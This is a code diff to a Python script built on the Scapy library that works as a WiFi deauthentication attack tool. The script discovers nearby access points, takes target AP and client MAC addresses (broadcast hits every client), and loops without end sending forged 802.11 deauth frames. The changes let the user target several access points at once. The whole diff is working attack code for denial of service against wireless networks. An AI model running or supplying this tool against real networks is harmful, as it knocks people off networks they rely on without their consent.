@@ -7,9 +7,8 @@ import time
 import subprocess
 import os
 
-client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
 found = {}
-probe_list = []
+host_list = []
 aps = []
 
 if len(sys.argv) < 2:
@@ -42,7 +41,7 @@ def sniffmgmt(p):
 
 def discover():
   global aps
-  global probe_list
+  global host_list
   # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
   n = ""
   while n.isdigit() != True:
@@ -51,16 +50,16 @@ def discover():
 
   sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)
 
-  probe_list = []
+  host_list = []
 
   # Make an array version of found so that each AP has a number associated with it for the user to choose
   for key,probe in found.items():
     item = [key,probe]
-    probe_list.append(item)
+    host_list.append(item)
 
   # Print out the list of discovered APs and their index so that the user can choose one
-  for i in range(len(probe_list)):
-    item = probe_list[i]
+  for i in range(len(host_list)):
+    item = host_list[i]
     print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
 
   # Get & process user input
@@ -75,7 +74,7 @@ def discover():
       sys.exit()
   # n = int(n)
 
-  aps = list(map(int, n.split(",")))
+  aps = list(map(int, n.replace(" ", "").split(",")))
 
 # Get AP address(es)
 if manual == "0":
@@ -83,13 +82,15 @@ if manual == "0":
 
 if manual == "1":
   # TODO: Add option to add multiple mac addresses
-  probe_list.append([0, {"cli": input("target AP MAC address : ")}])
-  aps = [0]
+  entered = input("target AP MAC address (use commas to seperate multiple) : ").replace(" ", "").split(",")
+  for i in range(len(entered)):
+    host_list.append([1, {"cli": entered[i]}])
+  aps = range(len(entered))
   # TODO: Check if mac address is valid
 
 # Option for manual client entry
 # TODO: Add option for multiple clients
-client = input("\nnmap can be used to find target client Mac addresses\ntarget client MAC address (* - all clients) : ")
+client = input("target client MAC address (* - all clients) : ")
 # TODO: Check if mac address is valid
 if client == "*":
   client = "FF:FF:FF:FF:FF:FF"
@@ -97,9 +98,11 @@ if client == "*":
 # Send packets forever
 while True:
   for n in aps:
-    ap = probe_list[n][1]["cli"]
-    print(ap)
+    ap = host_list[n][1]["cli"]
 
     # Create & send packet
     packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
     sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
+    print("ap     : " + ap)
+    print("client : " + client)
+    print()
